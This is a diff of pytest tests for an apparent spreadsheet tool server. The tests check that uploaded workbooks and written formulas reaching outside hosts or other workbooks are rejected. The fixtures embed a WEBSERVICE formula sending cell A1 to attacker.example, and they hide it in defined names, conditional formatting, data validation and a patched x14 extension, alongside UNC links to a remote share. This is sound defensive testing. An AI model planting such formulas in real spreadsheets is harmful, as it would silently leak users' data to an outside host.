@@ -4,12 +4,16 @@ import asyncio
 import base64
 import io
 import zipfile
+from collections.abc import Callable
 from pathlib import Path
 
 import pytest
 from mcp import Client
 from openpyxl import Workbook, load_workbook
 from openpyxl.drawing.image import Image
+from openpyxl.formatting.rule import ColorScaleRule, FormulaRule
+from openpyxl.workbook.defined_name import DefinedName
+from openpyxl.worksheet.datavalidation import DataValidation
 from PIL import Image as PillowImage
 
 from tests.conftest import ToolCall
@@ -229,3 +233,150 @@ async def test_macro_enabled_workbooks_can_be_edited(
     await call("write_range", path="macro.xlsm", sheet="Report", start_cell="A1", rows=[["x"]])
     data = await call("read_range", path="macro.xlsm", sheet="Report")
     assert data["values"] == [["x"]]
+
+
+ATTACK = 'WEBSERVICE("https://attacker.example/?d="&amp;A1)'
+X14_VALIDATION = (
+    '<extLst><ext uri="{CCE6A557-97BC-4b89-ADB6-D9C93CAAB3DF}" '
+    'xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main">'
+    '<x14:dataValidations count="1" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main">'
+    f'<x14:dataValidation type="list"><x14:formula1><xm:f>{ATTACK}</xm:f></x14:formula1>'
+    "<xm:sqref>A1</xm:sqref></x14:dataValidation></x14:dataValidations></ext></extLst>"
+)
+
+
+def _upload(build: Callable[[Workbook], None], patch: tuple[str, str, str] | None = None) -> str:
+    """A workbook made by ``build``, optionally with ``old`` replaced by ``new`` in one part."""
+    workbook = Workbook()
+    workbook.worksheets[0].title = "Data"
+    build(workbook)
+    buffer = io.BytesIO()
+    workbook.save(buffer)
+    content = buffer.getvalue()
+    if patch:
+        part, old, new = patch
+        source = zipfile.ZipFile(io.BytesIO(content))
+        patched = io.BytesIO()
+        with zipfile.ZipFile(patched, "w") as target:
+            for name in source.namelist():
+                data = source.read(name)
+                if name == part:
+                    assert old.encode() in data
+                    data = data.replace(old.encode(), new.encode())
+                target.writestr(name, data)
+        content = patched.getvalue()
+    return base64.b64encode(content).decode()
+
+
+def _defined_name(workbook: Workbook) -> None:
+    workbook.defined_names.add(DefinedName("evil", attr_text=ATTACK.replace("&amp;", "&")))
+    workbook["Data"]["A2"] = "=evil"
+
+
+def _sheet_name(workbook: Workbook) -> None:
+    workbook["Data"].defined_names.add(DefinedName("evil", attr_text=ATTACK.replace("&amp;", "&")))
+
+
+def _linked_name(workbook: Workbook) -> None:
+    workbook.defined_names.add(DefinedName("Sales", attr_text=r"'\203.0.113.7\share\b.xlsx'!Sales"))
+
+
+def _print_area(workbook: Workbook) -> None:
+    workbook["Data"].print_area = "A1:B2"
+
+
+def _conditional_format(workbook: Workbook) -> None:
+    rule = FormulaRule(formula=[ATTACK.replace("&amp;", "&")])
+    workbook["Data"].conditional_formatting.add("A1", rule)
+
+
+def _color_scale(workbook: Workbook) -> None:
+    rule = ColorScaleRule(
+        start_type="formula",
+        start_value=ATTACK.replace("&amp;", "&"),
+        start_color="FF0000",
+        end_type="max",
+        end_color="00FF00",
+    )
+    workbook["Data"].conditional_formatting.add("A1:A5", rule)
+
+
+def _validation(workbook: Workbook) -> None:
+    validation = DataValidation(type="custom", formula1=ATTACK.replace("&amp;", "&"))
+    validation.add("A1")
+    workbook["Data"].add_data_validation(validation)
+
+
+def _nothing(workbook: Workbook) -> None:
+    pass
+
+
+@pytest.mark.parametrize(
+    ("build", "patch"),
+    [
+        (_defined_name, None),
+        (_sheet_name, None),
+        (_linked_name, None),
+        # openpyxl warns about, and drops, print areas and x14 extensions it cannot load.
+        pytest.param(
+            _print_area,
+            ("xl/workbook.xml", "'Data'!$A$1:$B$2", ATTACK),
+            marks=pytest.mark.filterwarnings("ignore:Print area"),
+        ),
+        (_conditional_format, None),
+        (_color_scale, None),
+        (_validation, None),
+        pytest.param(
+            _nothing,
+            ("xl/worksheets/sheet1.xml", "</worksheet>", X14_VALIDATION + "</worksheet>"),
+            marks=pytest.mark.filterwarnings("ignore:Data Validation extension"),
+        ),
+    ],
+)
+async def test_uploads_check_formulas_outside_cells(
+    call_error: ToolCall,
+    files: Path,
+    build: Callable[[Workbook], None],
+    patch: tuple[str, str, str] | None,
+) -> None:
+    content = _upload(build, patch)
+    message = await call_error("import_workbook", path="up.xlsx", content_base64=content)
+    assert "not allowed" in message
+    assert not (files / "up.xlsx").exists()
+
+
+async def test_uploads_with_rules_and_names_on_own_sheets_are_accepted(
+    call: ToolCall, files: Path
+) -> None:
+    def build(workbook: Workbook) -> None:
+        lists = workbook.create_sheet("Lists")
+        lists.append(["a"])
+        data = workbook["Data"]
+        workbook.defined_names.add(DefinedName("Choices", attr_text="Lists!$A$1:$A$3"))
+        data.print_area = "A1:C10"
+        data.conditional_formatting.add("A1:A5", FormulaRule(formula=["Lists!$A$1>0"]))
+        validation = DataValidation(type="list", formula1="Choices")
+        validation.add("B1")
+        data.add_data_validation(validation)
+        data["C1"] = "=SUM(Lists!A1:A3)"
+
+    await call("import_workbook", path="up.xlsx", content_base64=_upload(build))
+    assert load_workbook(files / "up.xlsx").sheetnames == ["Data", "Lists"]
+
+
+@pytest.mark.parametrize(
+    "formula",
+    [
+        r"='\203.0.113.7\share\book.xlsx'!Sales",
+        "=SUM(Budget.xlsx!Sales)",
+        "=SUM([1]Sheet1!A1:OFFSET(A1,0,0))",
+        '=SUM(A1:INDIRECT("B2"))',
+    ],
+)
+async def test_written_formulas_cannot_reach_other_workbooks(
+    call_error: ToolCall, sample: Path, formula: str
+) -> None:
+    message = await call_error(
+        "write_range", path="sales.xlsx", sheet="Report", start_cell="A1", rows=[[formula]]
+    )
+    assert "not allowed" in message
